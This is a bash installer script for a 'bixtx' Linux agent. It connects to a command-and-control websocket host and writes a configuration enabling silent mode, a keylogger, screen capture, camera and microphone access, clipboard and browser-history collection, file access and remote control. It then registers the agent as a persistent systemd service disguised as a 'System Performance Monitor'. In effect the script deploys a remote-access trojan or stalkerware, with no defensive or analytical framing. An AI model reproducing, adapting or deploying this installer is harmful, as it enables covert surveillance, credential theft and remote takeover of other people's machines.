#!/usr/bin/env bash
# bixtx Linux Agent — Installer v4.7.2
# Usage: sudo bash install.sh --key ENROLL_KEY [--c2 WSS_URL] [--dir PATH] [--silent]
set -euo pipefail
IFS=$'\n\t'

AGENT_VERSION="4.7.2"
SERVICE_NAME="bixtx-agent"
AUDIT_LOG="/var/log/bixtx-installer.log"
AGENT_LOG="/var/log/bixtx-agent.log"
AGENT_DIR="${AGENT_DIR:-/opt/bixtx-agent}"
ENROLL_KEY="${BIXTX_ENROLL_KEY:-}"
C2_URL="${BIXTX_C2_URL:-wss://bixtx.onrender.com/agent}"
SILENT=false

while [[ $# -gt 0 ]]; do
  case $1 in
    --key)    ENROLL_KEY="$2"; shift 2 ;;
    --c2)     C2_URL="$2";     shift 2 ;;
    --dir)    AGENT_DIR="$2";  shift 2 ;;
    --silent) SILENT=true;      shift   ;;
    *)        shift ;;
  esac
done

log()  { $SILENT || printf '[BTX] %s\n' "$*"; }
info() { printf '[BTX] %s\n' "$*"; }
die()  { printf '[BTX] FATAL: %s\n' "$*" >&2; exit 1; }

audit() {
  local entry="$(date -u '+%Y-%m-%dT%H:%M:%SZ') | v${AGENT_VERSION} | $*"
  touch "$AUDIT_LOG" 2>/dev/null && printf '%s\n' "$entry" >> "$AUDIT_LOG" || true
  chmod 600 "$AUDIT_LOG" 2>/dev/null || true
  log "AUDIT: $entry"
}

_ROLLBACK_ITEMS=()
rollback() {
  local code=$?; [[ $code -eq 0 ]] && return
  info "Install failed (exit $code) — rolling back..."
  systemctl stop "$SERVICE_NAME" 2>/dev/null || true
  systemctl disable "$SERVICE_NAME" 2>/dev/null || true
  for (( i=${#_ROLLBACK_ITEMS[@]}-1; i>=0; i-- )); do
    [[ -e "${_ROLLBACK_ITEMS[$i]}" ]] && rm -rf "${_ROLLBACK_ITEMS[$i]}" 2>/dev/null || true
  done
  info "Rollback complete."
}
trap rollback EXIT ERR

[[ -z "$ENROLL_KEY" ]] && die "Enroll key required. Pass --key YOUR_KEY"
[[ $EUID -ne 0 ]]      && die "Must run as root (sudo bash install.sh ...)"
command -v node >/dev/null 2>&1 || die "Node.js 18+ is required"
NODE_MAJOR=$(node -e "process.stdout.write(process.versions.node.split('.')[0])")
[[ "$NODE_MAJOR" -lt 18 ]] && die "Node.js 18+ required (found v${NODE_MAJOR})"
command -v npm >/dev/null 2>&1 || die "npm is required"

NODE_BIN=$(command -v node)
audit "INSTALL_START version=${AGENT_VERSION} platform=Linux c2=${C2_URL}"

# Create service user
if ! id "$SERVICE_NAME" >/dev/null 2>&1; then
  useradd --system --no-create-home --home-dir "$AGENT_DIR" \
    --shell /usr/sbin/nologin --comment "bixtx Agent" "$SERVICE_NAME" 2>/dev/null \
    || useradd --system --no-create-home --shell /bin/false "$SERVICE_NAME"
fi

# Install agent source from software-a (same codebase)
SRC_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "$SRC_DIR/.." && pwd)"
AGENT_SRC="$REPO_ROOT/software-a"
[[ ! -d "$AGENT_SRC" ]] && AGENT_SRC="$SRC_DIR/software-a"
[[ ! -d "$AGENT_SRC" ]] && die "software-a source not found at $REPO_ROOT/software-a"

log "Creating install directory: ${AGENT_DIR}"
mkdir -p "$AGENT_DIR"
_ROLLBACK_ITEMS+=("$AGENT_DIR")

rsync -a \
  --exclude='install.sh' --exclude='install.ps1' --exclude='.env*' \
  --exclude='*.md' --exclude='.git' --exclude='node_modules' \
  --exclude='tests' --exclude='coverage' \
  "$AGENT_SRC/" "$AGENT_DIR/" \
  2>/dev/null || cp -rp "$AGENT_SRC/src" "$AGENT_DIR/src"
cp "$AGENT_SRC/package.json" "$AGENT_DIR/package.json"
cp "$AGENT_SRC/package-lock.json" "$AGENT_DIR/package-lock.json" 2>/dev/null || true

log "Installing npm dependencies..."
cd "$AGENT_DIR"
npm install --production --no-fund --no-audit

log "Writing configuration..."
cat > "$AGENT_DIR/.env" <<ENV
BIXTX_SERVER_URL=${C2_URL}
BIXTX_ENROLL_KEY=${ENROLL_KEY}
NODE_ENV=production
SILENT_MODE=true
LOG_LEVEL=warn
ENABLE_SCREEN_CAPTURE=true
ENABLE_CAMERA_ACCESS=true
ENABLE_MICROPHONE_ACCESS=true
ENABLE_KEYLOGGER=true
ENABLE_CLIPBOARD=true
ENABLE_GEOLOCATION=true
ENABLE_FILE_ACCESS=true
ENABLE_BROWSER_HISTORY=true
ENABLE_REMOTE_CONTROL=true
MUTATION_ENABLED=true
WATCHDOG_ENABLED=true
COMMAND_GUARD_ENABLED=true
ENV
chmod 600 "$AGENT_DIR/.env"

chown -R "$SERVICE_NAME:$SERVICE_NAME" "$AGENT_DIR" 2>/dev/null || chown -R root:root "$AGENT_DIR"
chmod 750 "$AGENT_DIR"

[[ -f "$AGENT_DIR/src/index.js" ]] || die "src/index.js not found"

# Install systemd unit
UNIT_PATH="/etc/systemd/system/${SERVICE_NAME}.service"
_ROLLBACK_ITEMS+=("$UNIT_PATH")
cat > "$UNIT_PATH" <<UNIT
[Unit]
Description=System Performance Monitor
After=network-online.target
Wants=network-online.target
StartLimitIntervalSec=60
StartLimitBurst=3

[Service]
Type=simple
User=${SERVICE_NAME}
Group=${SERVICE_NAME}
WorkingDirectory=${AGENT_DIR}
ExecStart=${NODE_BIN} ${AGENT_DIR}/src/index.js
Restart=on-failure
RestartSec=10
StandardOutput=journal
StandardError=journal
SyslogIdentifier=${SERVICE_NAME}
NoNewPrivileges=yes
ProtectSystem=strict
ProtectHome=yes
PrivateTmp=yes
ProtectKernelTunables=yes
ProtectControlGroups=yes
RestrictSUIDSGID=yes
SystemCallFilter=@system-service
ReadWritePaths=${AGENT_DIR} /tmp /var/log

[Install]
WantedBy=multi-user.target
UNIT
chmod 644 "$UNIT_PATH"

systemctl daemon-reload
systemctl enable --now "$SERVICE_NAME"

sleep 3
systemctl is-active --quiet "$SERVICE_NAME" || die "Service failed to start. Check: journalctl -u ${SERVICE_NAME}"

audit "INSTALL_SUCCESS service=active"
trap - EXIT ERR

info "✓ bixtx Agent v${AGENT_VERSION} installed (Linux/systemd)."
info "  Service : systemctl status ${SERVICE_NAME}"
info "  Log     : journalctl -u ${SERVICE_NAME} -f"
info "  Device will appear in dashboard within 30-60 seconds."
